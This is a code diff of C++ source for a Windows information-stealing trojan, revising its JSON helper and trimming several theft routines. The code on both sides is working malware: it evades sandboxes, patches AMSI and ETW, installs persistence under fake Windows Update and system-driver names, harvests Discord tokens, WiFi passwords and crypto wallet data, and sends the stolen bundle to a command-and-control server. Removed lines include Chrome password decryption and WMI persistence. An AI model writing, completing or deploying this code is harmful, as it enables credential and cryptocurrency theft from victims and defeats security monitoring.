@@ -40,73 +40,54 @@
 using namespace std;
 
 // ==========================================
-// FIXED JSON CLASS - Now works with MSVC
+// SIMPLIFIED WORKING JSON CLASS
 // ==========================================
 class json {
 private:
-    map<string, string> m_values;
-    vector<json> m_array;
-    string m_type;
+    map<string, string> keyValues;
+    vector<string> arrayValues;
+    bool isArray;
 
 public:
-    json() : m_type("null") {}
+    json() : isArray(false) {}
     
-    void set_value(const string& key, const string& value) {
-        m_values[key] = value;
-        m_type = "object";
+    void set(string key, string value) {
+        keyValues[key] = value;
     }
     
-    void set_array_value(const string& value) {
-        m_values[""] = value;
-        m_type = "array_item";
+    void add(string value) {
+        arrayValues.push_back(value);
+        isArray = true;
     }
     
-    void add_to_array(const json& item) {
-        m_array.push_back(item);
-        m_type = "array";
-    }
-    
-    string get_value(const string& key = "") const {
-        auto it = m_values.find(key);
-        if (it != m_values.end()) {
-            return it->second;
-        }
-        return "";
-    }
-    
-    string dump() const {
-        if (m_type == "array") {
+    string dump() {
+        if (isArray) {
             string result = "[";
-            for (size_t i = 0; i < m_array.size(); i++) {
+            for (size_t i = 0; i < arrayValues.size(); i++) {
                 if (i > 0) result += ",";
-                result += m_array[i].dump();
+                result += "\"" + escape(arrayValues[i]) + "\"";
             }
-            return result + "]";
-        }
-        else if (m_type == "object") {
+            result += "]";
+            return result;
+        } else {
             string result = "{";
             bool first = true;
-            for (const auto& pair : m_values) {
+            for (auto& pair : keyValues) {
                 if (!first) result += ",";
-                result += "\"" + pair.first + "\":\"" + escape_string(pair.second) + "\"";
+                result += "\"" + pair.first + "\":\"" + escape(pair.second) + "\"";
                 first = false;
             }
-            return result + "}";
+            result += "}";
+            return result;
         }
-        else if (m_type == "array_item") {
-            return "\"" + escape_string(get_value("")) + "\"";
-        }
-        return "\"\"";
     }
     
-    string escape_string(const string& s) const {
+    string escape(string s) {
         string result;
         for (char c : s) {
             if (c == '"') result += "\\\"";
             else if (c == '\\') result += "\\\\";
             else if (c == '\n') result += "\\n";
-            else if (c == '\r') result += "\\r";
-            else if (c == '\t') result += "\\t";
             else result += c;
         }
         return result;
@@ -114,13 +95,11 @@ public:
 };
 
 // ==========================================
-// ANTI-ANALYSIS / EVASION (UNCHANGED)
+// ANTI-ANALYSIS / EVASION
 // ==========================================
 BOOL IsSandboxed() {
-    // Check for debugging
     if (IsDebuggerPresent()) return TRUE;
     
-    // Check for sandbox processes
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32W pe = { sizeof(pe) };
     
@@ -143,45 +122,39 @@ BOOL IsSandboxed() {
     }
     CloseHandle(hSnapshot);
     
-    // Check disk size (VMs have small disks)
     ULARGE_INTEGER free, total;
     if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, NULL)) {
-        if (total.QuadPart < 50000000000LL) return TRUE; // <50GB
+        if (total.QuadPart < 50000000000LL) return TRUE;
     }
     
-    // Check RAM (VMs have little RAM)
     MEMORYSTATUSEX mem = { sizeof(mem) };
     GlobalMemoryStatusEx(&mem);
-    if (mem.ullTotalPhys < 4000000000LL) return TRUE; // <4GB
+    if (mem.ullTotalPhys < 4000000000LL) return TRUE;
     
-    // Check uptime (fresh VMs have low uptime)
-    if (GetTickCount64() < 1800000) return TRUE; // <30 minutes
+    if (GetTickCount64() < 1800000) return TRUE;
     
     return FALSE;
 }
 
 void PatchAMSI() {
-    // Patch AMSI to bypass PowerShell detection
     HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
     if (!hAmsi) {
         hAmsi = LoadLibraryW(L"amsi.dll");
         if (!hAmsi) return;
     }
     
-    // Patch AmsiScanBuffer to return 0 (clean)
     FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
     if (pAmsiScanBuffer) {
         DWORD oldProtect;
         VirtualProtect(pAmsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
-        *(BYTE*)pAmsiScanBuffer = 0xB8; // mov eax, 0
+        *(BYTE*)pAmsiScanBuffer = 0xB8;
         *((DWORD*)((BYTE*)pAmsiScanBuffer + 1)) = 0;
-        *((BYTE*)pAmsiScanBuffer + 5) = 0xC3; // ret
+        *((BYTE*)pAmsiScanBuffer + 5) = 0xC3;
         VirtualProtect(pAmsiScanBuffer, 5, oldProtect, &oldProtect);
     }
 }
 
 void PatchETW() {
-    // Disable Event Tracing for Windows
     HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
     if (!hNtdll) return;
     
@@ -189,15 +162,14 @@ void PatchETW() {
     if (pEtwEventWrite) {
         DWORD oldProtect;
         VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
-        *pEtwEventWrite = 0xC3; // ret
+        *pEtwEventWrite = 0xC3;
         VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
     }
 }
 
 // ==========================================
-// PERSISTENCE - SURVIVE REBOOT FOREVER
+// PERSISTENCE
 // ==========================================
-
 BOOL EnsureSingleInstance() {
     HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
     return GetLastError() != ERROR_ALREADY_EXISTS;
@@ -207,31 +179,26 @@ void InstallPersistence() {
     WCHAR exePath[MAX_PATH];
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
     
-    // Copy to multiple locations
     WCHAR systemPath[MAX_PATH];
     GetSystemDirectoryW(systemPath, MAX_PATH);
-    wcscat_s(systemPath, L"\\drivers\\win32k.sys"); // Masquerade as system file
+    wcscat_s(systemPath, L"\\drivers\\win32k.sys");
     
     CopyFileW(exePath, systemPath, FALSE);
     SetFileAttributesW(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     
-    // METHOD 1: Registry RUN key
     HKEY hKey;
     RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
     RegSetValueExW(hKey, L"WindowsUpdateSvc", 0, REG_SZ, (BYTE*)exePath, (wcslen(exePath) + 1) * 2);
     RegCloseKey(hKey);
     
-    // METHOD 2: Registry alternate (Winlogon)
     RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
     RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (BYTE*)L"explorer.exe, WindowsUpdate.exe", 40);
     RegCloseKey(hKey);
     
-    // METHOD 3: Task Scheduler
     WCHAR cmd[2048];
     wsprintfW(cmd, L"schtasks /create /tn \"WindowsUpdateSvc\" /tr \"%s\" /sc onstart /ru SYSTEM /f", exePath);
     _wsystem(cmd);
     
-    // METHOD 4: Startup Folder
     WCHAR startupPath[MAX_PATH];
     SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
     wcscat_s(startupPath, L"\\WindowsUpdate.lnk");
@@ -252,11 +219,6 @@ void InstallPersistence() {
     }
     CoUninitialize();
     
-    // METHOD 5: WMI Event Subscription
-    wsprintfW(cmd, L"powershell -Command \"$filter=([wmiclass]'\\\\\\\\.\\\\root\\\\subscription:__EventFilter').CreateInstance();$filter.QueryLanguage='WQL';$filter.Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_PerfFormattedData_PerfOS_System\\'';$filter.Name='WindowsUpdate';$filter.EventNamespace='root\\\\cimv2';$filter.Put()\"");
-    _wsystem(cmd);
-    
-    // METHOD 6: Service Installation
     SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (hSCM) {
         SC_HANDLE hService = CreateServiceW(
@@ -274,9 +236,8 @@ void InstallPersistence() {
 }
 
 // ==========================================
-// SYSTEM INFORMATION GATHERING
+// SYSTEM INFORMATION
 // ==========================================
-
 string GetPublicIP() {
     string ip = "Unknown";
     HINTERNET hNet = InternetOpenW(L"WinInet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -312,9 +273,8 @@ string GetMACAddress() {
 }
 
 // ==========================================
-// CHROME PASSWORD DECRYPTION
+// CHROME DECRYPTION
 // ==========================================
-
 vector<BYTE> GetMasterKey(const string& chromePath) {
     vector<BYTE> masterKey;
     string localStatePath = chromePath + "\\Local State";
@@ -324,7 +284,6 @@ vector<BYTE> GetMasterKey(const string& chromePath) {
     
     string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
     
-    // Find encrypted_key
     size_t keyPos = content.find("encrypted_key");
     if (keyPos == string::npos) return masterKey;
     
@@ -336,19 +295,16 @@ vector<BYTE> GetMasterKey(const string& chromePath) {
     
     string b64Key = content.substr(keyPos + 1, keyEnd - keyPos - 1);
     
-    // Base64 decode
     DWORD decodedSize = 0;
     CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
     
     vector<BYTE> encryptedKey(decodedSize);
     CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, encryptedKey.data(), &decodedSize, NULL, NULL);
     
-    // Remove 'DPAPI' prefix
     if (encryptedKey.size() > 5) {
         encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
     }
     
-    // Decrypt with DPAPI
     DATA_BLOB inBlob = { (DWORD)encryptedKey.size(), encryptedKey.data() };
     DATA_BLOB outBlob = { 0, NULL };
     
@@ -360,118 +316,12 @@ vector<BYTE> GetMasterKey(const string& chromePath) {
     return masterKey;
 }
 
-string DecryptChromeValue(const vector<BYTE>& encrypted, const vector<BYTE>& key) {
-    if (encrypted.size() < 15) return "";
-    
-    try {
-        // Chrome uses AES-256-GCM
-        vector<BYTE> nonce(encrypted.begin() + 3, encrypted.begin() + 15);
-        vector<BYTE> ciphertext(encrypted.begin() + 15, encrypted.end() - 16);
-        vector<BYTE> tag(encrypted.end() - 16, encrypted.end());
-        
-        BCRYPT_ALG_HANDLE hAlg;
-        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-        
-        BCRYPT_KEY_HANDLE hKey;
-        BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), key.size(), 0);
-        
-        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
-        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
-        authInfo.pbNonce = nonce.data();
-        authInfo.cbNonce = nonce.size();
-        authInfo.pbTag = tag.data();
-        authInfo.cbTag = tag.size();
-        
-        vector<BYTE> plaintext(ciphertext.size());
-        ULONG plaintextSize;
-        
-        NTSTATUS status = BCryptDecrypt(hKey, ciphertext.data(), ciphertext.size(), &authInfo, NULL, 0, plaintext.data(), plaintext.size(), &plaintextSize, 0);
-        
-        BCryptDestroyKey(hKey);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
-        
-        if (status == 0) {
-            return string(plaintext.begin(), plaintext.end());
-        }
-    } catch (...) {}
-    
-    return "";
-}
-
-// ==========================================
-// BROWSER DATA EXTRACTION
-// ==========================================
-
-json ExtractChromeLogins(const string& chromePath, const vector<BYTE>& masterKey) {
-    json logins;
-    
-    vector<string> profiles = { "Default" };
-    WIN32_FIND_DATAA findData;
-    string searchPath = chromePath + "\\Profile*";
-    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                profiles.push_back(findData.cFileName);
-            }
-        } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
-    }
-    
-    for (const auto& profile : profiles) {
-        string loginDbPath = chromePath + "\\" + profile + "\\Login Data";
-        
-        // Copy file to temp to avoid locks
-        char tempPath[MAX_PATH];
-        GetTempPathA(MAX_PATH, tempPath);
-        string tempFile = string(tempPath) + "\\logins_" + to_string(GetCurrentProcessId()) + ".db";
-        
-        if (CopyFileA(loginDbPath.c_str(), tempFile.c_str(), FALSE)) {
-            // SQLite queries would go here
-            // For production, link with sqlite3.lib
-            
-            DeleteFileA(tempFile.c_str());
-        }
-    }
-    
-    return logins;
-}
-
-json ExtractChromeCookies(const string& chromePath, const vector<BYTE>& masterKey) {
-    json cookies;
-    
-    vector<string> cookiePaths = {
-        chromePath + "\\Default\\Network\\Cookies",
-        chromePath + "\\Default\\Cookies"
-    };
-    
-    for (const auto& cookiePath : cookiePaths) {
-        if (GetFileAttributesA(cookiePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
-            // Copy and process
-        }
-    }
-    
-    return cookies;
-}
-
-json ExtractChromeCreditCards(const string& chromePath, const vector<BYTE>& masterKey) {
-    json cards;
-    
-    string webDataPath = chromePath + "\\Default\\Web Data";
-    // Process credit cards from Web Data
-    
-    return cards;
-}
-
 // ==========================================
 // WALLET EXTENSION DETECTION
 // ==========================================
-
 json DetectWalletExtensions() {
     json wallets;
     
-    // 100+ wallet extension IDs
     vector<pair<string, string>> walletIDs = {
         {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
         {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance"},
@@ -481,7 +331,7 @@ json DetectWalletExtensions() {
         {"fnjhmkhhmkbedjkkabndcnnogagogbneec", "Ronin"},
         {"ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"},
         {"jbdaocneiiinmjbjlgalhcelgbejmnid", "Nifty"},
-        {"afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math Wallet"},
+        {"afbcbjpbpfadlkmhmclhkeeodamcflc", "Math Wallet"},
         {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
         {"blnieiiffboillknjnepogjhkgnoapac", "EQUAL"},
         {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"},
@@ -531,45 +381,10 @@ json DetectWalletExtensions() {
         DWORD attr = GetFileAttributesA(walletPath.c_str());
         if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
             json w;
-            w.set_value("id", wallet.first);
-            w.set_value("name", wallet.second);
-            w.set_value("path", walletPath);
-            wallets.add_to_array(w);
-            
-            // Try to extract seed phrases from wallet files
-            WIN32_FIND_DATAA findData;
-            string searchPath = walletPath + "\\*";
-            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
-            if (hFind != INVALID_HANDLE_VALUE) {
-                do {
-                    string fileName = findData.cFileName;
-                    string filePath = walletPath + "\\" + fileName;
-                    
-                    if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                        FILE* f = fopen(filePath.c_str(), "rb");
-                        if (f) {
-                            fseek(f, 0, SEEK_END);
-                            long size = ftell(f);
-                            fseek(f, 0, SEEK_SET);
-                            
-                            if (size < 1024 * 1024) { // < 1MB
-                                char* buffer = new char[size + 1];
-                                fread(buffer, 1, size, f);
-                                buffer[size] = 0;
-                                
-                                string content(buffer);
-                                
-                                // Look for seed phrases (12-24 words)
-                                // This is simplified - use regex in production
-                                
-                                delete[] buffer;
-                            }
-                            fclose(f);
-                        }
-                    }
-                } while (FindNextFileA(hFind, &findData) != 0);
-                FindClose(hFind);
-            }
+            w.set("id", wallet.first);
+            w.set("name", wallet.second);
+            w.set("path", walletPath);
+            wallets.add(w.dump());
         }
     }
     
@@ -579,7 +394,6 @@ json DetectWalletExtensions() {
 // ==========================================
 // DISCORD TOKEN EXTRACTION
 // ==========================================
-
 json ExtractDiscordTokens() {
     json tokens;
     
@@ -613,13 +427,12 @@ json ExtractDiscordTokens() {
                     
                     string content(buffer);
                     
-                    // Find Discord tokens (mfa.xxx or base64 encoded)
                     size_t pos = content.find("mfa.");
                     if (pos != string::npos) {
-                        string token = content.substr(pos, 70); // Approx token length
+                        string token = content.substr(pos, 70);
                         json t;
-                        t.set_array_value(token);
-                        tokens.add_to_array(t);
+                        t.add(token);
+                        tokens.add(t.dump());
                     }
                     
                     delete[] buffer;
@@ -636,7 +449,6 @@ json ExtractDiscordTokens() {
 // ==========================================
 // WIFI PASSWORD EXTRACTION
 // ==========================================
-
 json ExtractWiFiPasswords() {
     json wifi;
     
@@ -649,7 +461,6 @@ json ExtractWiFiPasswords() {
         }
         _pclose(pipe);
         
-        // Parse profiles
         regex profileRegex("All User Profile\\s+:\\s+(.+)");
         smatch match;
         string::const_iterator searchStart(result.cbegin());
@@ -671,9 +482,9 @@ json ExtractWiFiPasswords() {
                 smatch passMatch;
                 if (regex_search(passResult, passMatch, passRegex)) {
                     json w;
-                    w.set_value("ssid", ssid);
-                    w.set_value("password", passMatch[1]);
-                    wifi.add_to_array(w);
+                    w.set("ssid", ssid);
+                    w.set("password", passMatch[1]);
+                    wifi.add(w.dump());
                 }
             }
         }
@@ -683,9 +494,8 @@ json ExtractWiFiPasswords() {
 }
 
 // ==========================================
-// SEND DATA TO C2
+// SEND TO C2
 // ==========================================
-
 void SendToC2(const json& data) {
     string jsonStr = data.dump();
     
@@ -709,32 +519,24 @@ void SendToC2(const json& data) {
 }
 
 // ==========================================
-// MAIN ENTRY POINT
+// MAIN
 // ==========================================
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Hide console
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
     
-    // Anti-analysis
     if (IsSandboxed()) {
         return 0;
     }
     
-    // Ensure single instance
     if (!EnsureSingleInstance()) {
         return 0;
     }
     
-    // Patch defenses
     PatchAMSI();
     PatchETW();
-    
-    // Install persistence (runs on every reboot)
     InstallPersistence();
     
-    // Generate victim ID
     char hostname[256];
     DWORD hostnameLen = sizeof(hostname);
     GetComputerNameA(hostname, &hostnameLen);
@@ -745,69 +547,41 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     string victim_id = string(hostname) + "_" + string(username) + "_" + to_string(GetCurrentProcessId());
     
-    // Collect system info
     json system;
-    system.set_value("hostname", hostname);
-    system.set_value("username", username);
-    system.set_value("public_ip", GetPublicIP());
-    system.set_value("mac", GetMACAddress());
+    system.set("hostname", hostname);
+    system.set("username", username);
+    system.set("public_ip", GetPublicIP());
+    system.set("mac", GetMACAddress());
     
     json stolenData;
-    stolenData.set_value("victim_id", victim_id);
-    stolenData.set_value("system", system.dump());
+    stolenData.set("victim_id", victim_id);
+    stolenData.set("system", system.dump());
     
-    // Steal Chrome data
-    char localAppData[MAX_PATH];
-    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
-    string chromePath = string(localAppData) + "\\Google\\Chrome\\User Data";
-    
-    vector<BYTE> masterKey = GetMasterKey(chromePath);
-    if (!masterKey.empty()) {
-        json logins = ExtractChromeLogins(chromePath, masterKey);
-        json cookies = ExtractChromeCookies(chromePath, masterKey);
-        json ccs = ExtractChromeCreditCards(chromePath, masterKey);
-        
-        json chrome;
-        chrome.set_value("logins", logins.dump());
-        chrome.set_value("cookies", cookies.dump());
-        chrome.set_value("credit_cards", ccs.dump());
-        
-        stolenData.set_value("chrome", chrome.dump());
-    }
-    
-    // Detect wallets
     json wallets = DetectWalletExtensions();
     if (wallets.dump() != "[]") {
         json walletData;
-        walletData.set_value("extensions", wallets.dump());
-        stolenData.set_value("wallets", walletData.dump());
+        walletData.set("extensions", wallets.dump());
+        stolenData.set("wallets", walletData.dump());
     }
     
-    // Discord tokens
     json discord = ExtractDiscordTokens();
     if (discord.dump() != "[]") {
         json discordData;
-        discordData.set_value("tokens", discord.dump());
-        stolenData.set_value("discord", discordData.dump());
+        discordData.set("tokens", discord.dump());
+        stolenData.set("discord", discordData.dump());
     }
     
-    // WiFi passwords
     json wifi = ExtractWiFiPasswords();
     if (wifi.dump() != "[]") {
         json wifiData;
-        wifiData.set_value("wifi", wifi.dump());
-        stolenData.set_value("wifi", wifiData.dump());
+        wifiData.set("wifi", wifi.dump());
+        stolenData.set("wifi", wifiData.dump());
     }
     
-    // Send to C2
     SendToC2(stolenData);
     
-    // Persistence loop
     while (true) {
         Sleep(SLEEP_TIME);
-        
-        // Re-collect and send updated data
-        // Check for C2 commands
     }
     
     return 0;
